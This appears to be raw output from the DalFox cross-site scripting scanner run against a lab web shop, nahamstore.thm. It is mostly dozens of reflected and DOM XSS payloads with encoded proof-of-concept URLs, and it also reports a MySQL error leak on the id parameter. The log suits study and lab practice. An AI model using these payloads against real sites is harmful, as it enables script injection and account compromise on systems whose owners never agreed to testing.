 ⛏   Mining                 true (Gf-Patterns)
 🔬  Mining-DOM             true (mining from DOM)
 ⏱   Timeout                10
 📤  FollowRedirect         false
 🕰   Started at             2023-03-21 11:55:16.768737313 -0400 EDT m=+1.072962520

 >>>>>>>>>>>>>>>>>>>>>>>>>
[*] 🦊 Start scan [SID:Single] / URL: http://nahamstore.thm/product?id=2&added=1&discount=
[G] Found dalfox-error-mysql5 via built-in grepping / payload: toGrepping
    check the manual that corresponds to your MySQL server version
[POC][G][GET][BUILTIN] http://nahamstore.thm/product?added=1&discount=&id=%7B444%2A6664%7D
[I] Found 4 testing point in DOM base parameter mining
[I] Found 3 testing point in Dictionary base paramter mining
[I] Content-Type is text/html; charset=UTF-8
[I] Reflected PATH '/dalfoxpathtest' => Injected: /inHTML-none(1)]
[I] Reflected discount param => PTYPE: URL  Injected: /inATTR-double(1)  \  :  +  "  [  |  ]  ,  ;  .  =  (  )  $  }  -  {
    56 line:  e="discount" value="DalFox"><
[I] Reflected id param => PTYPE: URL  Injected: /inHTML-none(1)  $
    1 line:  Unknown column '2DalFox' in 'where cl
[I] Reflected name param => PTYPE: URL  Injected: /inHTML-none(1)  <  \  >  '  "  {  :  (  |  }  ]  +  [  `  -  ,  =  .  ;  )  $
    7 line:      <title>NahamStore - DalFox</t
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=v(1)><source src=1.mp3 type
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dv%281%29%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[V] Triggered XSS Payload (found DOM Object): discount="onpointerenter=confirm.call(null,1) class=dalfox 
    56 line:  e="discount" value=""onpointerenter=confirm.call(null,1) class=dalfox "></div>
[POC][V][GET][inATTR-double(1)-URL] http://nahamstore.thm/product?added=1&discount=%22onpointerenter%3Dconfirm.call%28null%2C1%29+class%3Ddalfox+&id=2
[V] Triggered XSS Payload (found DOM Object): id=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
[POC][V][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=print(1) class=dalfox>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=print(1) class=dalfox></tit
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprint%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name='>asdme" param and waiting headless
    7 line:      <title>NahamStore - '>asd</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3Easd
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert.bind()(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert.bind%28%29%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name='><svg/class='dalfox'onLoad=alert(1)>
    7 line:      <title>NahamStore - '><svg/class='dalfox'onLoad=alert(1)></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE></ti
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aconfirm%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<sVg/onload=confirm(1)>ing headless
    7 line:      <title>NahamStore - <sVg/onload=confirm(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dconfirm%281%29%3E
[W] Reflected Payload in HTML: name="><Svg/onload=alert(1) class=dlafox>
    7 line:      <title>NahamStore - "><Svg/onload=alert(1) class=dlafox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CSvg%2Fonload%3Dalert%281%29+class%3Ddlafox%3E
[W] Reflected Payload in HTML: name=<ScRipt>confirm(1)</script>
    7 line:      <title>NahamStore - <ScRipt>confirm(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Econfirm%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=confirm(1) class=dalfox></t
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dconfirm%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=confirm(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=confirm(1) id=dalfox><sourc
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dconfirm%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" clas
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprompt.valueOf%28%29%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=confirm(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dconfirm%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)></title
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%281%29%3E
[W] Reflected Payload in HTML: name=<sVg/onload=alert.bind()(1)>nd waiting headless
    7 line:      <title>NahamStore - <sVg/onload=alert.bind()(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert.bind%28%29%281%29%3E
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=alert(1) id=dalfox><source 
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dalert%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>confirm(1)</script>eadless
    7 line:      <title>NahamStore - <ScRipt class=dalfox>confirm(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Econfirm%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE></titl
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprint%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<audio controls ondurationchange=alert.bind()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
    7 line:  <title>NahamStore - <audio controls ondurationchange=alert.bind()(1) id=dalfox><
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dalert.bind%28%29%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
[W] Reflected Payload in HTML: name=<sVg/onload=prompt(1)>eries and waiting headless
    7 line:      <title>NahamStore - <sVg/onload=prompt(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt%281%29%3E
[W] Reflected Payload in HTML: name="><a href="javascript&colon;alert(1)">click
    7 line:      <title>NahamStore - "><a href="javascript&colon;alert(1)">click</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Ca+href%3D%22javascript%26colon%3Balert%281%29%22%3Eclick
[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=da
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert.bind%28%29%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name=">asdd" param queries and waiting headless
    7 line:      <title>NahamStore - ">asd</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3Easd
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprompt%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name=<sVg/onload=print(1)>aiting headless
    7 line:      <title>NahamStore - <sVg/onload=print(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprint%281%29%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=confirm(1)>
    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=confirm(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dconfirm%281%29%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></titl
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:confirm(1)></iFramE>dless
    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:confirm(1)></iFramE></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aconfirm%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=prompt.valueOf()(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprompt.valueOf%28%29%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name="><img/src/onerror=.1|alert`` class=dalfox>
    7 line:      <title>NahamStore - "><img/src/onerror=.1|alert`` class=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<sVg/onload=prompt.valueOf()(1)>waiting headless
    7 line:      <title>NahamStore - <sVg/onload=prompt.valueOf()(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt.valueOf%28%29%281%29%3E
[W] Reflected Payload in HTML: name='><img/src/onerror=.1|alert``>d waiting headless
    7 line:      <title>NahamStore - '><img/src/onerror=.1|alert``></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E
[W] Reflected Payload in HTML: name="><SvG/onload=alert(1) id=dalfox>
    7 line:      <title>NahamStore - "><SvG/onload=alert(1) id=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<ScRipt>print(1)</script>
    7 line:      <title>NahamStore - <ScRipt>print(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Eprint%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name="><svg/OnLoad="`${prompt``}`">d waiting headless
    7 line:      <title>NahamStore - "><svg/OnLoad="`${prompt``}`"></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E
[W] Reflected Payload in HTML: name=<sVg/onload=print(1) class=dalfox>
    7 line:      <title>NahamStore - <sVg/onload=print(1) class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprint%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iF
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context onshow=alert(1)></menu></div>
    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context onshow=alert(1)>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+onshow%3Dalert%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
[W] Reflected Payload in HTML: name='"><img/src/onerror=.1|alert``>
    7 line:      <title>NahamStore - '"><img/src/onerror=.1|alert``></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E
[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>prompt.valueOf()(1)</script>
    7 line:  <title>NahamStore - <ScRipt class=dalfox>prompt.valueOf()(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Eprompt.valueOf%28%29%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert(1) class=dalfox>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert(1) class=dalfox></tit
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<sVg/onload=confirm(1) class=dalfox>
    7 line:      <title>NahamStore - <sVg/onload=confirm(1) class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dconfirm%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dconfirm%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name='><sVg/onload=alert(1) id=dalfox>waiting headless
    7 line:      <title>NahamStore - '><sVg/onload=alert(1) id=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3CsVg%2Fonload%3Dalert%281%29+id%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=print(1)>eadless
    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=print(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprint%281%29%3E
[W] Reflected Payload in HTML: name='"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - '"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt(1)>
    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt%281%29%3E
[W] Reflected Payload in HTML: name=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
    7 line:      <title>NahamStore - </ScriPt><sCripT class=dalfox>alert(1)</sCriPt></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3C%2FScriPt%3E%3CsCripT+class%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E
[W] Reflected Payload in HTML: name='"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
    7 line:  <title>NahamStore - '"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f<
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Csvg%2Fonload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f
[W] Reflected Payload in HTML: name='><sVg/onload=alert(1) class=dalfox>ting headless
    7 line:      <title>NahamStore - '><sVg/onload=alert(1) class=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<ScRipt>alert.bind()(1)</script>
    7 line:      <title>NahamStore - <ScRipt>alert.bind()(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Ealert.bind%28%29%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>ess
    7 line:      <title>NahamStore - <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CdETAILS%250aopen%250aonToGgle%250a%3D%250aa%3Dprompt%2Ca%28%29%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert(1)></iFramE>
    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:alert(1)></iFramE></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>prompt(1)</script>g headless
    7 line:      <title>NahamStore - <ScRipt class=dalfox>prompt(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Eprompt%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE>
    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE></tit
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name="><svg/OnLoad="`${prompt``}`" class=dalfox>
    7 line:      <title>NahamStore - "><svg/OnLoad="`${prompt``}`" class=dalfox></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name="><d3"<"/onclick=">[confirm``]"<">ziting headless
    7 line:      <title>NahamStore - "><d3"<"/onclick=">[confirm``]"<">z</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
[W] Reflected Payload in HTML: name=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>
    7 line:  <title>NahamStore - <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox><
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CdETAILS%250aopen%250aonToGgle%250a%3D%250aa%3Dprompt%2Ca%28%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<ScRipt>prompt.valueOf()(1)</script>eadless
    7 line:      <title>NahamStore - <ScRipt>prompt.valueOf()(1)</script></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Eprompt.valueOf%28%29%281%29%3C%2Fscript%3E
[W] Reflected Payload in HTML: name='><a href=javas&#99;ript:alert(1)/class=dalfox>click
    7 line:  <title>NahamStore - '><a href=javas&#99;ript:alert(1)/class=dalfox>click</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick
[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
[W] Reflected Payload in HTML: name="><a href=javas&#99;ript:alert(1)/class=dalfox>click
    7 line:  <title>NahamStore - "><a href=javas&#99;ript:alert(1)/class=dalfox>click</title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick
[W] Reflected Payload in HTML: name=<sVg/onload=alert(1)>queries and waiting headless
    7 line:      <title>NahamStore - <sVg/onload=alert(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert%281%29%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox></ti
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE>
    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert.bind%28%29%281%29%3E%3C%2FiFramE%3E
[W] Reflected Payload in HTML: name="><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z
    7 line:  <title>NahamStore - "><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z</titl
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cw%3D%22%2Fx%3D%22y%3E%22%2Fclass%3Ddalfox%2Fondblclick%3D%60%3C%60%5Bconfirm%60%60%5D%3Ez
[W] Reflected Payload in HTML: name=<sVg/onload=prompt.valueOf()(1) class=dalfox>less
    7 line:      <title>NahamStore - <sVg/onload=prompt.valueOf()(1) class=dalfox></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt.valueOf%28%29%281%29+class%3Ddalfox%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert.bind()(1)>
    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert.bind()(1)></title>
[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert.bind%28%29%281%29%3E
[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert(1)>
    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert(1)></title>
[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%281%29%3E
[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox></iframe>
    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox><
